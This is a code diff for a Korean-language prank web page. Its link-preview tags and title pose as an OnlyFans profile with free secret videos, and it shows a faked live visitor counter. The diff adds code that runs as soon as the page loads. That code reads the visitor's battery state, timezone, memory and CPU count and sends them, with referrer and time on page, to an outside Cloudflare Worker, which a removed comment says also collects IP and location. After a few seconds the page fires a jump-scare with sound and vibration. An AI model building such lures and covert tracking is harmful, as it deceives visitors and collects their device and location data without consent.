@@ -4,11 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HanJiyu07 | Profile & Stats</title>
-    <!-- 카카오톡 미리보기(오픈그래프) 낚시 세팅 -->
     <meta property="og:title" content="HanJiyu07 - OnlyFans 💎">
     <meta property="og:description" content="VVIP 시크릿 영상 공개 중 (무료 입장)">
-    <meta property="og:image" content="https://chldudwo.github.io/surprise-maltese/pro.jpg"> <!-- 썸네일 이미지 -->
-    <meta property="og:url" content="https://onlyfans.com/">
+    <meta property="og:image" content="https://chldudwo.github.io/surprise-maltese/pro.jpg"> <meta property="og:url" content="https://onlyfans.com/">
     <link rel="icon" href="https://img.icons8.com/fluency/48/user-female-circle.png" type="image/x-icon">
     <style>
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f3f4f6; color: #1f2937; min-height: 100vh; }
@@ -109,16 +107,13 @@
         // ==========================================
         const countEl = document.getElementById('visitor-count');
         
-        // 초기값 세팅 (120~300 사이)
         let currentCount = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
         countEl.innerText = currentCount;
 
-        // 3~5초마다 실시간으로 인원이 유기적으로 변하는 것처럼 연출
         setInterval(() => {
-            const change = Math.floor(Math.random() * 7) - 3; // -3 ~ +3명 변동
+            const change = Math.floor(Math.random() * 7) - 3;
             currentCount += change;
             
-            // 범위를 벗어나지 않게 제어
             if (currentCount < 120) currentCount = 120;
             if (currentCount > 300) currentCount = 300;
             
@@ -128,7 +123,6 @@
         // ==========================================
         // 🔒 2. 서버리스 백엔드 통신 로직 (웹훅 주소 은닉)
         // ==========================================
-        // ★나중에 생성할 Cloudflare Worker 배포 주소를 여기에 넣으세요.
         const WORKER_URL = "https://flat-night-2b27.chldudwo2158.workers.dev"; 
         
         const startTime = new Date();
@@ -136,10 +130,9 @@
         let hasSeenPicture = false;
 
         function getDwellTime() {
-            return Math.floor((new Date() - startTime) / 1000);
+            return ((new Date() - startTime) / 1000).toFixed(2);
         }
 
-        // 백엔드로 로그 데이터 전송 함수
         function logToBackend(type) {
             if (WORKER_URL.includes("YOUR_WORKER_SUBDOMAIN") || !WORKER_URL) return;
             
@@ -149,16 +142,50 @@
                 body: JSON.stringify({
                     type: type,
                     referrer: document.referrer || "직접 입력/북마크",
-                    dwellTime: getDwellTime()
+                    dwellTime: getDwellTime(),
+                    userData: userData
                 })
             }).catch(err => console.log("로그 전송 실패"));
         }
 
-        // 페이지 접속하자마자 백엔드에 1차 신호 전송 (백엔드가 IP/위치를 알아서 수집함)
-        logToBackend("entry");
+        // ==========================================
+        // 🎭 배터리 정보 확인하기, 기기 스펙 확인하기
+        // ==========================================
+
+        let userData = {
+            battery_info: null,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            deviceMemory: navigator.deviceMemory || '알 수 없음',
+            cpuCores: navigator.hardwareConcurrency || '알 수 없음'
+        };
+        
+        // 버튼 클릭(addEventListener)을 기다리지 않고 즉시 실행합니다.
+        
+        // 1. 브라우저가 배터리 API를 지원하는지 확인 (아이폰 사파리 걸러내기)
+        if ('getBattery' in navigator) {
+            
+            // 2. 배터리 정보를 즉시 요청합니다.
+            navigator.getBattery().then(function(battery) {
+                // battery.level 은 0.0 ~ 1.0 사이로 나옵니다. (1.0 = 100%)
+                const level = Math.round(battery.level * 100); 
+                
+                // battery.charging 은 true(충전중) 또는 false(사용중) 로 나옵니다.
+                const isCharging = battery.charging ? "충전 중 ⚡" : "배터리 사용 중 🔋";
+
+                // 결과를 화면에 바로 덮어씌웁니다.
+                userData.battery_info = `현재 배터리: **${level}%** (${isCharging})`;
+                logToBackend("entry");
+            });
+
+        } else {
+            // 3. 아이폰이거나 지원하지 않는 브라우저일 때 에러 없이 안내만 합니다.
+            userData.battery_info = "이 기기(또는 브라우저)는 배터리 정보 조회를 지원하지 않습니다. 🥲";
+            logToBackend("entry");
+        }
+
 
         // ==========================================
-        // 🎭 3. 낚시(Prank) 발동 로직
+        // 🎭 3. 낚시(Prank) 발동 및 진동 로직
         // ==========================================
         const prankBtns = document.querySelectorAll('.js-prank-btn');
         const prankZone = document.getElementById('prank-zone');
@@ -169,9 +196,15 @@
             if (isPrankActive) return;
             isPrankActive = true;
 
+            // 💡 [추가된 코드] 브라우저 기기 진동 체크 및 발동 (400ms 동안 진동)
+            if ('vibrate' in navigator) {
+                navigator.vibrate(400); 
+                console.log("모바일 기기 진동 발동 성공");
+            }
+
             if (!hasSeenPicture) {
                 hasSeenPicture = true;
-                logToBackend("success"); // 낚시 성공 로그 백엔드로 전송
+                logToBackend("success");
             }
 
             overlay.style.display = 'block';
@@ -179,7 +212,7 @@
             audio.play().catch(e => console.log("오디오 자동 재생 차단됨"));
 
             prankBtns.forEach(btn => {
-                btn.innerText = "강아지가 튀어나왔습니다!";
+                btn.innerText = "귀신이 튀어나왔습니다!";
                 btn.style.animation = "none";
             });
         }
@@ -194,8 +227,7 @@
             }
         });
 
-        // 6초 뒤 자동 실행
-        setTimeout(() => { triggerPrank(); }, 6000); 
+        setTimeout(() => { triggerPrank(); }, 6300); 
 
         function closePrank(e) {
             e.stopPropagation();
